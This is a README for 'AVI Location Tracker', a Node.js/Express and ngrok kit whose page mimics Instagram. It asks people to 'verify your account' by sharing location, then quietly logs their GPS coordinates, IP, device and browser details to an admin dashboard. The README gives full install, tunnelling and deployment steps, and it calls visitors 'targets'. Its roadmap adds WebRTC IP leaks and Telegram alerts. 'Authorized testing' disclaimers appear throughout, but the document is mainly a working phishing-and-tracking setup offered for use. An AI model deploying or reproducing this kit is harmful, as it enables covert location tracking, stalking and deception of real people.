<!-- ═══════════════════════════════════════════════════════════════ -->
<!--              AVI // LOCATION TRACKER  —  v1.0                   -->
<!--         NODE.JS · EXPRESS · NGROK · TERMUX · WINDOWS            -->
<!-- ═══════════════════════════════════════════════════════════════ -->

<div align="center">

```
    ▄▄▄       ██▒   █▓ ██▓
   ▒████▄    ▓██░   █▒▓██▒
   ▒██  ▀█▄   ▓██  █▒░▒██▒
   ░██▄▄▄▄██   ▒██ █░░░██░
    ▓█   ▓██▒   ▒▀█░  ░██░
    ▒▒   ▓▒█░   ░ ▐░  ░▓
     ▒   ▒▒ ░   ░ ░░   ▒ ░
     ░   ▒        ░░   ▒ ░
         ░  ░      ░   ░
                  ░
```

# `> AVI :: LOCATION_TRACKER_`

### `[ ASYNC GPS CAPTURE // LIVE DASHBOARD // NGROK TUNNEL ]`

**`POWERED BY`** &nbsp; **`A V I`**

<br>

[![Typing SVG](https://readme-typing-svg.demolab.com?font=Fira+Code&weight=700&size=20&pause=800&color=00FF41&background=00000000&center=true&vCenter=true&width=760&lines=%5B+INITIALIZING+AVI+CORE+%5D;%5B+LOADING+EXPRESS+SERVER+%5D;%5B+STARTING+NGROK+TUNNEL+%5D;%5B+AWAITING+TARGET+INTERACTION+%5D;%5B+POWERED+BY+AVI+%5D)](https://github.com/)

<br>

![Node](https://img.shields.io/badge/NODE.JS-16%2B-000000?style=for-the-badge&logo=nodedotjs&logoColor=00FF41&labelColor=000000)
![Express](https://img.shields.io/badge/EXPRESS-4.X-000000?style=for-the-badge&logo=express&logoColor=00FF41&labelColor=000000)
![ngrok](https://img.shields.io/badge/NGROK-TUNNEL-000000?style=for-the-badge&logo=ngrok&logoColor=00FF41&labelColor=000000)
![Termux](https://img.shields.io/badge/TERMUX-READY-000000?style=for-the-badge&logo=android&logoColor=00FF41&labelColor=000000)
![License](https://img.shields.io/badge/LICENSE-MIT-000000?style=for-the-badge&logo=opensourceinitiative&logoColor=00FF41&labelColor=000000)
![Powered By](https://img.shields.io/badge/POWERED%20BY-AVI-000000?style=for-the-badge&logo=terminal&logoColor=00FF41&labelColor=000000)

<br>

```
┌──────────────────────────────────────────────────────────┐
│  [ SYSTEM ] :: AVI_CORE v1.0                             │
│  [ STATUS ] :: ████████████████████ 100% READY           │
│  [ STACK  ] :: NODE // EXPRESS // NGROK // JSON          │
│  [ AUTHOR ] :: AVI                                       │
└──────────────────────────────────────────────────────────┘
```

</div>

---

<div align="center">

## `[!] AUTHORIZATION REQUIRED`

> ```
> ⚠  THIS TOOL IS FOR AUTHORIZED SECURITY TESTING ONLY
> ⚠  UNAUTHORIZED LOCATION TRACKING IS ILLEGAL
> ⚠  YOU ARE RESPONSIBLE FOR YOUR OWN ACTIONS
> ```

</div>

---

## `> whoami`

```bash
$ cat /etc/avi/about.txt
```

> **AVI Location Tracker** is a demonstration-grade GPS-capture stack built from
> three parts, **powered by AVI**.
>
> 1. **Front-end** (`public/index.html`) — an Instagram-style feed that
>    requests location permission to "verify your account", then silently
>    captures GPS coordinates when the user allows.
> 2. **Back-end** (`server.js`) — Node.js + Express that stores every capture
>    in `locations.json` and prints a live alert to the terminal.
> 3. **Tunnel** (ngrok) — exposes your local server to the internet so the page
>    can be loaded from any device anywhere.
>
> An **admin dashboard** at `/admin` shows every capture with a clickable
> Google Maps link.

```diff
+ Single-file Express backend (server.js)
+ Zero config, zero database
+ Runs on Windows · Linux · macOS · Termux (Android)
+ Real-time terminal alerts per capture
+ Public HTTPS via ngrok in one command
+ Persistent JSON storage — locations.json
```

---

## `> features --list`

<div align="center">

<table>
<tr>
<td width="50%" valign="top">

### `[+] FRONT-END`

```bash
► Instagram-styled feed
► blurred until verified
► "Verify Location" gate
► silent GPS capture
► denied fallback screen
► responsive mobile layout
```

</td>
<td width="50%" valign="top">

### `[+] BACK-END`

```bash
► Node.js + Express
► REST API
► locations.json persistence
► ANSI console alerts
► "decrypting…" animation
► /admin dashboard route
```

</td>
</tr>
<tr>
<td width="50%" valign="top">

### `[+] NETWORKING`

```bash
► ngrok HTTPS tunnel
► real public IP capture
► phone / tablet / PC ready
► no firewall changes
► free ngrok tier OK
```

</td>
<td width="50%" valign="top">

### `[+] OUTPUT`

```bash
► live terminal panels
► JSON file per capture
► admin dashboard
► maps links
► ngrok inspector @:4040
```

</td>
</tr>
</table>

</div>

---

## `> tree --project`

```
project/
├── server.js              # Node.js backend
├── package.json           # auto-generated
├── locations.json         # auto-created on first capture
├── README.md              # this file
├── LICENSE
├── .gitignore
└── public/
    ├── index.html         # Instagram bait + location gate
    └── admin.html         # admin dashboard
```

---

## `> requirements`

| TOOL | VERSION | WIN | LINUX | MAC | TERMUX |
|------|---------|:---:|:-----:|:---:|:------:|
| **Node.js** | 16+ | ✅ | ✅ | ✅ | ✅ |
| **npm** | ships with Node | ✅ | ✅ | ✅ | ✅ |
| **ngrok** | latest | ✅ | ✅ | ✅ | ✅ |
| **modern browser** | Chrome / Safari / Firefox / Edge | ✅ | ✅ | ✅ | ✅ |

```bash
$ node -v
$ npm -v
```

---

## `> install`

<details open>
<summary><b>🪟 WINDOWS</b></summary>

<br>

```powershell
# 1. Install Node.js LTS from nodejs.org — check "Add to PATH"
node -v
npm -v

# 2. Install ngrok (download from ngrok.com/download)
#    then authenticate once:
ngrok config add-authtoken YOUR_TOKEN_HERE

# 3. Install project deps
cd path\to\project
npm init -y
npm install express
```

</details>

<details>
<summary><b>📱 TERMUX (ANDROID)</b></summary>

<br>

```bash
# 1. Install Node.js + tools
pkg update && pkg upgrade -y
pkg install nodejs-lts wget git -y
node -v
npm -v

# 2. Get project
cd ~
git clone https://github.com/<your-username>/<your-repo>.git
cd <your-repo>

# 3. Install deps
npm init -y
npm install express

# 4. Install ngrok (ARM64 binary)
wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.tgz
tar xvzf ngrok-v3-stable-linux-arm64.tgz
mv ngrok $PREFIX/bin/
chmod +x $PREFIX/bin/ngrok
rm ngrok-v3-stable-linux-arm64.tgz

# 5. Authenticate
ngrok config add-authtoken YOUR_TOKEN_HERE

# 6. Prevent Android from killing Termux
termux-wake-lock
```

> ⚠️ Always keep the project in `~/project`, **not** in `~/storage/shared/...`.

</details>

<details>
<summary><b>🐧 LINUX &nbsp;/&nbsp; 🍎 MACOS</b></summary>

<br>

```bash
# Node.js
sudo apt install nodejs npm         # Ubuntu / Debian
brew install node                   # macOS

# ngrok
curl -s https://ngrok-agent.s3.amazonaws.com/ngrok.asc \
  | sudo tee /etc/apt/trusted.gpg.d/ngrok.asc >/dev/null
echo "deb https://ngrok-agent.s3.amazonaws.com buster main" \
  | sudo tee /etc/apt/sources.list.d/ngrok.list
sudo apt update && sudo apt install ngrok      # Ubuntu / Debian
brew install ngrok                             # macOS

# Auth
ngrok config add-authtoken YOUR_TOKEN_HERE

# Project
cd ~/project
npm init -y
npm install express
```

</details>

---

## `> config --frontend`

Edit `public/index.html` and find:

```javascript
const CAPTURE_ENDPOINT = '';
```

Change to:

```javascript
const CAPTURE_ENDPOINT = '/api/location';
```

Quick editor commands:

```powershell
notepad public\index.html      # Windows
```

```bash
nano public/index.html         # Termux / Linux / macOS
# Ctrl+O, Enter, Ctrl+X to save
```

---

## `> run`

### Terminal A — backend

```bash
$ node server.js
```

```
╔══════════════════════════════════════════════╗
║  [+] Payload server    : http://localhost:3000
║  [+] Admin dashboard   : http://localhost:3000/admin
║  [+] JSON storage      : /path/locations.json
║  [+] Awaiting target interaction...
╚══════════════════════════════════════════════╝
```

### Terminal B — ngrok tunnel

```bash
$ ngrok http 3000
```

```
Session Status    online
Account           your-email (Plan: Free)
Version           3.x.x
Region            India (in)
Web Interface     http://127.0.0.1:4040
Forwarding        https://a1b2-c3d4.ngrok-free.app -> http://localhost:3000
```

**Your public URL is** the `https://...ngrok-free.app` line.

### 📱 Termux — second session

- **Swipe from left edge** → tap **NEW SESSION**
- Or pull down the Termux notification → **NEW SESSION**

```bash
# Terminal A
termux-wake-lock
cd ~/project
node server.js

# Terminal B (new session)
termux-wake-lock
ngrok http 3000
```

Release wake locks when done:

```bash
termux-wake-unlock
```

---

## `> ngrok --tunnel`

| PURPOSE | URL |
|---------|-----|
| Public URL (share with test device) | `https://<random>.ngrok-free.app` |
| Local URL | `http://localhost:3000` |
| Admin dashboard (local) | `http://localhost:3000/admin` |
| Admin dashboard (remote) | `https://<random>.ngrok-free.app/admin` |
| Live request inspector | `http://127.0.0.1:4040` |

> **Why HTTPS matters:** browsers only allow `navigator.geolocation` on
> `https://` or `localhost`. ngrok gives you HTTPS for free.

> Free ngrok sometimes shows an interstitial page ("You are about to visit …").
> Tap **Visit Site** once — the request still reaches your server.

> ⚠️ **Never** share the `/admin` URL with a target.

---

## `> test --sanity`

### Option A — local browser

Open `http://localhost:3000` → Instagram page loads blurred → tap **Allow
Location Access** → browser asks → **Allow** → feed unlocks → server logs
light up.

### Option B — curl

```bash
curl -X POST http://localhost:3000/api/location \
  -H "Content-Type: application/json" \
  -d '{"lat":19.0760,"lng":72.8777,"accuracy":12.4}'
```

**Windows PowerShell:**
```powershell
curl.exe -X POST http://localhost:3000/api/location `
  -H "Content-Type: application/json" `
  -d '{\"lat\":19.0760,\"lng\":72.8777,\"accuracy\":12.4}'
```

Expected: `{"success":true,"id":"..."}`

Verify:
- Terminal A → alert panel ✅
- `locations.json` → new entry ✅
- `/admin` → row appears ✅

### Option C — real GPS from another device

1. Start server + ngrok
2. Copy the ngrok `https://...` URL
3. Open it on the second device (only in **authorized** tests)
4. Tap **Allow Location Access** → **Allow**
5. Terminal A lights up with real GPS from that device

---

## `> output --where`

### 1. Terminal A — server console

```
>>> INCOMING TRANSMISSION DETECTED <<<
[ ▘ ] Decrypting geolocation payload...
┌──────────────────────────────────────────┐
│  📡  TARGET LOCATION ACQUIRED            │
├──────────────────────────────────────────┤
│  ID        : 1712345678901-a8f3k2        │
│  IP ADDR   : 203.0.113.7                 │
│  LATITUDE  : 19.076                      │
│  LONGITUDE : 72.8777                     │
│  ACCURACY  : 12.4 m                      │
│  MAPS      : https://google.com/maps?q=… │
└──────────────────────────────────────────┘
```

### 2. Admin dashboard

`http://localhost:3000/admin` → table of captures with maps links.

### 3. JSON file

`locations.json`:

```json
[
  {
    "id": "1712345678901-a8f3k2",
    "ip": "203.0.113.7",
    "lat": 19.076,
    "lng": 72.8777,
    "accuracy": 12.4,
    "screen": "1080x2340",
    "userAgent": "Mozilla/5.0 ...",
    "timestamp": 1712345678901,
    "receivedAt": "2024-04-05T18:34:38.901Z"
  }
]
```

**On Termux:**
```bash
pkg install jq -y
cat ~/project/locations.json | jq
cat ~/project/locations.json | jq '. | length'   # count
cat ~/project/locations.json | jq '.[-1]'        # latest
```

### 4. ngrok inspector

`http://127.0.0.1:4040` → live HTTP request/response viewer.

---

## `> payload --capture`

Every capture POSTs this JSON to `/api/location`:

```json
{
  "lat": 19.076,
  "lng": 72.8777,
  "accuracy": 12.4,
  "timestamp": 1712345678901,
  "userAgent": "Mozilla/5.0 (Linux; Android 13) ...",
  "screen": "1080x2340",
  "language": "en-IN",
  "referrer": null,
  "ip": "203.0.113.7"
}
```

| FIELD | SOURCE |
|-------|--------|
| `lat` / `lng` | browser GPS |
| `accuracy` | GPS API (m) |
| `timestamp` | GPS fix time |
| `userAgent` | browser |
| `screen` | `window.screen` |
| `language` | browser |
| `referrer` | HTTP header |
| `ip` | ipify + server socket |

Server also reads `x-forwarded-for` (ngrok sets it) and `remoteAddress`.

---

## `> flow --diagram`

```
1. Target opens  https://<random>.ngrok-free.app
        │
        ▼
2. Instagram feed (blurred) + "Verify Location" modal
        │
        ▼
3. Target taps [ Allow Location Access ]
        │
        ▼
4. Browser native geolocation prompt
        │
        ├── DENY  →  🔒 Blocked screen
        │
        ▼
   ALLOW
        │
        ▼
5. GPS resolved silently
        │
        ▼
6. Frontend POSTs to /api/location
        │
        ▼
7. ngrok → local server:3000
        │
        ▼
8. server.js:
        • prints "INCOMING TRANSMISSION"
        • appends to locations.json
        • returns { success: true }
        │
        ▼
9. Feed unlocks — Instagram looks normal
        │
        ▼
10. You view captures at /admin
```

---

## `> api --routes`

| METHOD | PATH | EFFECT |
|--------|------|--------|
| `GET`  | `/` | serve `public/index.html` |
| `GET`  | `/admin` | serve `public/admin.html` |
| `POST` | `/api/location` | save capture → `{success, id}` |
| `GET`  | `/api/locations` | return all captures |
| `DELETE` | `/api/locations` | wipe all captures |
| `GET`  | `/health` | `OK` |

---

## `> termux --pro-tips`

### Background server

```bash
termux-wake-lock
node server.js &
disown
```

Return with `fg` or `jobs`.

### One-tap launch via Termux:Widget

Install **Termux:Widget** from F-Droid, then:

```bash
mkdir -p ~/.shortcuts
nano ~/.shortcuts/start-tracker
```

Paste:

```bash
#!/data/data/com.termux/files/usr/bin/bash
cd ~/project
termux-wake-lock
node server.js &
sleep 1
ngrok http 3000
```

```bash
chmod +x ~/.shortcuts/start-tracker
```

Now one tap from your home screen launches the stack.

### Health checks

```bash
curl http://localhost:3000/health       # server
# open http://127.0.0.1:4040 in Chrome  # ngrok
```

---

## `> troubleshooting`

| PROBLEM | CAUSE | FIX |
|---------|-------|-----|
| `Cannot find module 'express'` | not installed | `npm install express` |
| `EADDRINUSE: port 3000` | port taken | kill old process or `PORT=3001 node server.js` |
| `node: command not found` | Node missing | Win: reinstall. Termux: `pkg install nodejs-lts` |
| `EACCES` (Termux) | running from `/storage/` | move project to `~/project` |
| Termux killed server | Android suspend | `termux-wake-lock` + disable battery optimization |
| ngrok `exec format error` | wrong arch | use the **arm64** build |
| ngrok `command not found` | not in PATH | `mv ngrok $PREFIX/bin/ && chmod +x $PREFIX/bin/ngrok` |
| ngrok `authentication failed` | no authtoken | `ngrok config add-authtoken <token>` |
| ngrok browser warning | free-tier interstitial | tap **Visit Site** once |
| Location never reaches server | endpoint not set | `public/index.html` → `'/api/location'` |
| Browser refuses geolocation | not HTTPS | use the ngrok `https://` URL |
| IP shows `127.0.0.1` / `::1` | testing same machine | test from another device |
| `locations.json` empty | POST not arriving | check ngrok inspector `:4040` |
| Emoji garbled (CMD) | old codepage | `chcp 65001` first, or Windows Terminal |
| Emoji garbled (Termux) | locale | `export LANG=en_US.UTF-8` |

---

## `> stop --everything`

| PLATFORM | STOP SERVER | STOP NGROK |
|----------|-------------|------------|
| Windows | `Ctrl+C` in Terminal A | `Ctrl+C` in Terminal B |
| Termux | `Ctrl+C` or close session | `Ctrl+C` |
| Linux / macOS | `Ctrl+C` | `Ctrl+C` |

Release Termux wake lock:

```bash
termux-wake-unlock
```

Clear captures:

```bash
rm locations.json          # Windows: del locations.json
```

Or click **Clear all** on `/admin`.

---

## `> roadmap`

```diff
[ ] map view on admin dashboard
[ ] CSV export button
[ ] local HTTPS with self-signed cert
[ ] WebRTC local-IP leak detection
[ ] battery / hardware info capture
[ ] multi-session append logging
[ ] Discord / Telegram webhook alerts
```

---

## `> legal`

```
╔══════════════════════════════════════════════════════════╗
║  AUTHORIZED SECURITY TESTING ONLY                        ║
║                                                          ║
║  ✅ your own devices             ❌ unauthorized users   ║
║  ✅ signed-scope engagements     ❌ public deployment    ║
║  ✅ consent-based training       ❌ real-world targeting ║
║  ✅ CTF / lab environments       ❌ stalking / doxxing   ║
║                                                          ║
║  Penalties:                                              ║
║    India — IT Act §66, §66C, §66D    (up to 3 years)     ║
║    USA   — CFAA                       (federal felony)   ║
║    UK    — Computer Misuse Act        (up to 10 years)   ║
║    EU    — GDPR Art. 6 & 7            (heavy fines)      ║
║                                                          ║
║  The author (AVI) accepts NO liability for misuse.       ║
║  You alone are responsible for your actions.             ║
╚══════════════════════════════════════════════════════════╝
```

### 🔴 Required banner for awareness training

Add to the top of `public/index.html`:

```html
<div style="position:fixed;top:0;left:0;right:0;background:#dc2626;
            color:#fff;text-align:center;padding:10px;font-weight:800;
            z-index:99999;font-family:sans-serif;">
  ⚠️ SECURITY AWARENESS DEMO — THIS IS NOT INSTAGRAM
</div>
```

Delete `locations.json` after each session.

---

## `> license`

**MIT** — see [`LICENSE`](LICENSE).

---

## `> credits`

- **Node.js** — runtime
- **Express** — HTTP server
- **ngrok** — public tunnel
- **AVI** — everything else

---

<div align="center">

```
┌──────────────────────────────────────────────┐
│                                              │
│              P O W E R E D   B Y             │
│                                              │
│              ░█▀█░█░█░▀█▀                    │
│              ░█▀█░▀▄▀░░█░                    │
│              ░▀░▀░░▀░░░▀░                    │
│                                              │
│                   A  V  I                    │
│                                              │
└──────────────────────────────────────────────┘
```

### `[ AVI // LOCATION TRACKER // v1.0 ]`

**`⭐ star the repo if AVI helped you`**

```
> connection closed by remote host_
```

</div>

<!-- ═══════════════════════════════════════════════════════════════ -->
<!--                    EOF :: POWERED BY AVI                        -->
<!-- ═══════════════════════════════════════════════════════════════ -->
